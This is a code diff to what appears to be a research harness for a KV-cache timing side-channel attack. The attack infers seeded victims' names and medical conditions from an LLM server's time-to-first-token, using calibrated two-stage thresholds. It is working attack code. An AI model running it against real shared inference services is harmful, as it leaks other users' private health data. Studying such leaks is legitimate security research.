@@ -63,8 +63,8 @@ from transformers import AutoTokenizer
 
 from kv_attack import (
     FIRST_NAMES, LAST_NAMES, MEDICAL_CONDITIONS,
-    N_REPEATS_FAST, N_REPEATS_CONFIRM, N_TOP_CANDIDATES, RESEED_EVERY,
-    BLOCK_SIZE,
+    N_REPEATS_FAST, N_REPEATS_STAGE1, N_REPEATS_CONFIRM,
+    N_TOP_CANDIDATES, RESEED_EVERY, BLOCK_SIZE,
 )
 from kv_attack.backends.base import BackendClient
 from kv_attack.two_stage_victim_seeder import (
@@ -212,87 +212,176 @@ def calibrate_two_stage(
     """
     Calibrate both T1 and T2 thresholds empirically.
 
-    HIT distribution      : correct name + correct condition (all 192 blocks)
-    S1_HIT distribution   : correct name + dummy  condition (128 blocks)
-    MISS distribution     : wrong  name + dummy  condition  (  0 blocks)
+    Three TTFT distributions are measured:
+      HIT    : correct name  + correct condition  — all 192 blocks cached
+      S1_HIT : correct name  + unique wrong cond  — 128 name blocks cached,
+                                                    64 condition blocks MISSED
+      MISS   : unique wrong name + anything       — 0 blocks cached
 
-    T1 = Youden-J optimal separator between MISS and S1_HIT
-    T2 = Youden-J optimal separator between S1_HIT and HIT
+    T1 = Youden-J optimal separator between MISS and S1_HIT (name gate)
+    T2 = Youden-J optimal separator between S1_HIT and HIT  (condition gate)
+
+    CRITICAL IMPLEMENTATION NOTES
+    ------------------------------
+    For the HIT distribution: repeat the same hit_prompt N times — all N
+    calls hit the cache ✓.
+
+    For the S1_HIT distribution: each sample MUST use a DIFFERENT wrong
+    condition token so that the condition block's hash is unique per call.
+    Without this, the first call caches the condition block and all
+    subsequent calls produce full hits (~80 ms) instead of the partial hit
+    (~264 ms) we need. Fix: append a unique UUID suffix to the dummy
+    condition for every sample.
+
+    For the MISS distribution: each sample MUST use a DIFFERENT wrong name
+    so the name block hash is unique per call. Without this, the first call
+    caches the miss prompt and all subsequent calls return cache hits.
+    Fix: use a UUID-based name for every sample (same pattern as the linear
+    calibrator's miss_prompt_factory in attacker.py).
+
+    SEPARABILITY GUARD
+    ------------------
+    After measuring, all three KS p-values are checked:
+      ks_hit_vs_miss   — must be < KS_ALPHA (should always pass)
+      ks_s1hit_vs_miss — must be < KS_ALPHA (validates the intermediate level)
+      ks_hit_vs_s1hit  — must be < KS_ALPHA (validates Stage 2 is feasible)
+
+    If ks_s1hit_vs_miss or ks_hit_vs_s1hit fail, the intermediate TTFT level
+    does NOT exist on this model/template combination. The harness should fall
+    back to the linear attack (adaptive_reconstructor) instead of proceeding
+    with broken thresholds.
     """
+    import uuid as _uuid
+
     gt        = victim_record["ground_truth"]
     true_name = gt["name"]
     true_cond = gt["condition"]
     true_dob  = gt["dob"]
 
-    # Build representative prompts
-    hit_prompt   = build_two_stage_prompt(
+    # ── HIT samples: same prompt repeated N times — all N are cache hits ──────
+    hit_prompt = build_two_stage_prompt(
         system_prefix, true_name, true_dob, true_cond, tokenizer
     )
-    s1_hit_prompt = build_two_stage_prompt(
-        system_prefix, true_name, true_dob, true_cond, tokenizer,
-        use_dummy_cond=True
-    )
-    # Use first-name-only wrong candidate
-    wrong_name = f"{FIRST_NAMES[0]} {LAST_NAMES[-1]}" if true_name != f"{FIRST_NAMES[0]} {LAST_NAMES[-1]}" \
-                 else f"{FIRST_NAMES[1]} {LAST_NAMES[-1]}"
-    miss_prompt = build_two_stage_prompt(
-        system_prefix, wrong_name, true_dob, _DUMMY_CONDITION, tokenizer
-    )
+    print(f"[calibrate_v2] Measuring {n_samples} HIT samples "
+          f"(192 blocks, same prompt repeated) ...")
+    hit_ttfts = backend.measure_ttft_repeated(hit_prompt, n=n_samples)
 
-    print(f"[calibrate_v2] Measuring {n_samples} HIT samples (all 192 blocks)...")
-    hit_ttfts    = backend.measure_ttft_repeated(hit_prompt, n=n_samples)
+    # ── S1_HIT samples: right name + UNIQUE wrong condition each call ─────────
+    # Appending a unique hex suffix keeps the name block hash identical
+    # (same true_name) while making the condition block hash unique on every
+    # call, so the condition blocks never accumulate in cache.
+    print(f"[calibrate_v2] Measuring {n_samples} S1_HIT samples "
+          f"(128 name blocks hit, 64 cond blocks miss — unique dummy cond each call) ...")
+    s1_hit_ttfts = np.array([
+        backend.measure_ttft(
+            build_two_stage_prompt(
+                system_prefix, true_name, true_dob,
+                f"{_DUMMY_CONDITION}_{_uuid.uuid4().hex[:8]}",  # unique each call
+                tokenizer, use_dummy_cond=True,
+            )
+        )
+        for _ in range(n_samples)
+    ])
 
-    print(f"[calibrate_v2] Measuring {n_samples} S1-HIT samples (128 name blocks)...")
-    s1_hit_ttfts = backend.measure_ttft_repeated(s1_hit_prompt, n=n_samples)
+    # ── MISS samples: unique wrong name each call ──────────────────────────────
+    # Same pattern as miss_prompt_factory() in attacker.py. The UUID prefix
+    # guarantees block N is unique per call → never cached → always a cold miss.
+    print(f"[calibrate_v2] Measuring {n_samples} MISS samples "
+          f"(0 blocks hit — unique UUID name each call) ...")
+    miss_ttfts = np.array([
+        backend.measure_ttft(
+            build_two_stage_prompt(
+                system_prefix,
+                f"MISS{_uuid.uuid4().hex[:12]}",  # unique name per call
+                true_dob, _DUMMY_CONDITION, tokenizer,
+            )
+        )
+        for _ in range(n_samples)
+    ])
 
-    print(f"[calibrate_v2] Measuring {n_samples} MISS samples (0 blocks)...")
-    miss_ttfts   = backend.measure_ttft_repeated(miss_prompt, n=n_samples)
+    # ── Separability checks ───────────────────────────────────────────────────
+    KS_ALPHA = 1e-8
+    ks_hit_miss,  p_hit_miss  = scipy.stats.ks_2samp(hit_ttfts, miss_ttfts)
+    ks_s1_miss,   p_s1_miss   = scipy.stats.ks_2samp(s1_hit_ttfts, miss_ttfts)
+    ks_hit_s1,    p_hit_s1    = scipy.stats.ks_2samp(hit_ttfts, s1_hit_ttfts)
 
-    # KS tests
-    ks_hit_miss, p_hit_miss     = scipy.stats.ks_2samp(hit_ttfts, miss_ttfts)
-    ks_s1_miss,  p_s1_miss      = scipy.stats.ks_2samp(s1_hit_ttfts, miss_ttfts)
-    ks_hit_s1,   p_hit_s1       = scipy.stats.ks_2samp(hit_ttfts, s1_hit_ttfts)
+    hit_mean  = float(hit_ttfts.mean())
+    s1_mean   = float(s1_hit_ttfts.mean())
+    miss_mean = float(miss_ttfts.mean())
 
-    def youden_threshold(a: np.ndarray, b: np.ndarray) -> float:
-        """Youden-J optimal threshold between two distributions (a=positive, b=negative)."""
-        all_v  = np.concatenate([a, b])
-        labels = np.concatenate([np.ones(len(a)), np.zeros(len(b))])
+    print(f"[calibrate_v2] HIT    mean={hit_mean:.1f} ms  std={float(hit_ttfts.std()):.1f} ms")
+    print(f"[calibrate_v2] S1_HIT mean={s1_mean:.1f} ms  std={float(s1_hit_ttfts.std()):.1f} ms  "
+          f"(analytical: {T_S1_HIT_MS:.1f} ms)")
+    print(f"[calibrate_v2] MISS   mean={miss_mean:.1f} ms  std={float(miss_ttfts.std()):.1f} ms")
+    print(f"[calibrate_v2] KS hit/miss:   stat={ks_hit_miss:.4f}  p={p_hit_miss:.2e}")
+    print(f"[calibrate_v2] KS s1/miss:    stat={ks_s1_miss:.4f}  p={p_s1_miss:.2e}")
+    print(f"[calibrate_v2] KS hit/s1_hit: stat={ks_hit_s1:.4f}  p={p_hit_s1:.2e}")
+
+    # Guard: the base hit-vs-miss channel must exist
+    if p_hit_miss >= KS_ALPHA:
+        raise RuntimeError(
+            f"[calibrate_v2] FATAL: HIT vs MISS not separable "
+            f"(p={p_hit_miss:.2e}). APC may be disabled or victims not seeded."
+        )
+
+    # Guard: the intermediate S1_HIT level must exist for the two-stage attack
+    intermediate_feasible = (p_s1_miss < KS_ALPHA) and (p_hit_s1 < KS_ALPHA)
+    if not intermediate_feasible:
+        # Don't raise — let the harness decide whether to fall back.
+        # The 'feasible' flag in the return dict signals the harness.
+        print(
+            f"[calibrate_v2] WARNING: Intermediate S1_HIT level NOT separable. "
+            f"p_s1_miss={p_s1_miss:.2e}, p_hit_s1={p_hit_s1:.2e}. "
+            f"The two-stage speedup is NOT achievable on this model/template. "
+            f"Fall back to linear_early_exit (adaptive_reconstructor)."
+        )
+
+    # ── Youden-J thresholds ───────────────────────────────────────────────────
+    def youden_threshold(pos: np.ndarray, neg: np.ndarray) -> float:
+        """Youden-J optimal threshold separating pos (hits) from neg (misses)."""
+        all_v  = np.concatenate([pos, neg])
+        labels = np.concatenate([np.ones(len(pos)), np.zeros(len(neg))])
         order  = np.argsort(all_v)
-        sv     = all_v[order]; sl = labels[order]
-        ch     = np.cumsum(sl); cm = np.cumsum(1 - sl)
+        sv     = all_v[order]
+        sl     = labels[order]
+        ch     = np.cumsum(sl)
+        cm     = np.cumsum(1 - sl)
         th     = int(ch[-1]); tm = int(cm[-1])
-        sens   = ch[:-1] / th; spec = 1.0 - cm[:-1] / tm
+        sens   = ch[:-1] / th
+        spec   = 1.0 - cm[:-1] / tm
         j      = sens + spec - 1.0
         idx    = int(np.argmax(j))
         return float((sv[idx] + sv[idx + 1]) / 2.0)
 
-    t1 = youden_threshold(s1_hit_ttfts, miss_ttfts)    # separates S1_HIT from MISS
-    t2 = youden_threshold(hit_ttfts,    s1_hit_ttfts)  # separates HIT from S1_HIT
+    t1 = youden_threshold(s1_hit_ttfts, miss_ttfts)    # S1_HIT is positive; MISS is negative
+    t2 = youden_threshold(hit_ttfts,    s1_hit_ttfts)  # HIT is positive; S1_HIT is negative
 
-    print(f"[calibrate_v2] HIT    mean={hit_ttfts.mean():.1f} ms")
-    print(f"[calibrate_v2] S1_HIT mean={s1_hit_ttfts.mean():.1f} ms  "
-          f"(expected {T_S1_HIT_MS:.1f} ms)")
-    print(f"[calibrate_v2] MISS   mean={miss_ttfts.mean():.1f} ms")
-    print(f"[calibrate_v2] T1 (name gate)     = {t1:.1f} ms  "
+    print(f"[calibrate_v2] T1 (name gate)      = {t1:.1f} ms  "
           f"(analytical: {T1_THRESHOLD_MS:.1f} ms)")
-    print(f"[calibrate_v2] T2 (condition gate) = {t2:.1f} ms  "
+    print(f"[calibrate_v2] T2 (condition gate)  = {t2:.1f} ms  "
           f"(analytical: {T2_THRESHOLD_MS:.1f} ms)")
+    if intermediate_feasible:
+        print(f"[calibrate_v2] ✓ Two-stage attack is feasible on this configuration.")
+    else:
+        print(f"[calibrate_v2] ✗ Two-stage attack NOT feasible. "
+              f"Use linear_early_exit instead.")
 
     return {
-        "t1_threshold_ms"   : round(t1, 4),
-        "t2_threshold_ms"   : round(t2, 4),
-        "hit_mean_ms"       : round(float(hit_ttfts.mean()), 4),
-        "hit_std_ms"        : round(float(hit_ttfts.std()), 4),
-        "s1_hit_mean_ms"    : round(float(s1_hit_ttfts.mean()), 4),
-        "s1_hit_std_ms"     : round(float(s1_hit_ttfts.std()), 4),
-        "miss_mean_ms"      : round(float(miss_ttfts.mean()), 4),
-        "miss_std_ms"       : round(float(miss_ttfts.std()), 4),
-        "ks_hit_vs_miss"    : {"stat": round(float(ks_hit_miss), 6), "p": float(p_hit_miss)},
-        "ks_s1hit_vs_miss"  : {"stat": round(float(ks_s1_miss), 6),  "p": float(p_s1_miss)},
-        "ks_hit_vs_s1hit"   : {"stat": round(float(ks_hit_s1), 6),   "p": float(p_hit_s1)},
-        "t1_analytical_ms"  : T1_THRESHOLD_MS,
-        "t2_analytical_ms"  : T2_THRESHOLD_MS,
-        "s1_hit_analytical_ms": T_S1_HIT_MS,
+        "t1_threshold_ms"        : round(t1, 4),
+        "t2_threshold_ms"        : round(t2, 4),
+        "intermediate_feasible"  : intermediate_feasible,
+        "hit_mean_ms"            : round(hit_mean, 4),
+        "hit_std_ms"             : round(float(hit_ttfts.std()), 4),
+        "s1_hit_mean_ms"         : round(s1_mean, 4),
+        "s1_hit_std_ms"          : round(float(s1_hit_ttfts.std()), 4),
+        "miss_mean_ms"           : round(miss_mean, 4),
+        "miss_std_ms"            : round(float(miss_ttfts.std()), 4),
+        "ks_hit_vs_miss"         : {"stat": round(float(ks_hit_miss), 6), "p": float(p_hit_miss)},
+        "ks_s1hit_vs_miss"       : {"stat": round(float(ks_s1_miss),  6), "p": float(p_s1_miss)},
+        "ks_hit_vs_s1hit"        : {"stat": round(float(ks_hit_s1),   6), "p": float(p_hit_s1)},
+        "t1_analytical_ms"       : T1_THRESHOLD_MS,
+        "t2_analytical_ms"       : T2_THRESHOLD_MS,
+        "s1_hit_analytical_ms"   : T_S1_HIT_MS,
     }
 
 
@@ -339,13 +428,17 @@ def reconstruct_victim_two_stage(
             except Exception as exc:
                 print(f"[reconstructor_v2] WARNING: Stage 1 reseed failed: {exc}")
 
-        # Stage 1 probe: name block + dummy condition block
+        # Stage 1 probe: name block + dummy condition block.
+        # Use N_REPEATS_STAGE1 (default 3) instead of N_REPEATS_FAST (1)
+        # because the S1_HIT vs MISS gap (~175 ms below T1) is tighter than
+        # the full HIT vs MISS gap — averaging 3 samples reduces false positives
+        # without tripling overall cost (Stage 1 is only ~50 probes out of ~763).
         probe = build_two_stage_prompt(
             system_prefix, cand_name, dob, _DUMMY_CONDITION, tokenizer,
             use_dummy_cond=True,
         )
-        mean_ttft  = backend.measure_mean_ttft(probe, n=N_REPEATS_FAST)
-        s1_calls  += N_REPEATS_FAST
+        mean_ttft  = backend.measure_mean_ttft(probe, n=N_REPEATS_STAGE1)
+        s1_calls  += N_REPEATS_STAGE1
 
         is_s1_hit = mean_ttft < t1_ms
         s1_log.append({
@@ -409,12 +502,19 @@ def reconstruct_victim_two_stage(
             confirmed_condition = cand_cond
             break
 
-    # Stage 2 fallback
+    # Stage 2 fallback: no probe crossed t2_ms → take the condition with the
+    # lowest observed TTFT as the best guess. This is statistically correct if
+    # the TTFT distributions are separable (condition gate works); if they are
+    # not separable, the fallback is a random guess and success_rate will be low.
+    # The feasibility guard in week13_harness should have caught this case first.
     if confirmed_condition is None:
         best = min(s2_log, key=lambda x: x["mean_ttft"])
         confirmed_condition = best["condition"]
         print(f"[reconstructor_v2] Victim {victim_id}: "
-              f"Stage 2 NO HIT — fallback to '{confirmed_condition}'")
+              f"Stage 2 NO HIT — fallback to best-TTFT candidate "
+              f"'{confirmed_condition}' (mean_ttft={best['mean_ttft']:.1f} ms). "
+              f"If this is wrong, T2={t2_ms:.1f} ms may be miscalibrated — "
+              f"re-run calibrate_two_stage() with more samples.")
 
     # ── Confirmation ──────────────────────────────────────────────────────────
     confirm_probe = build_two_stage_prompt(
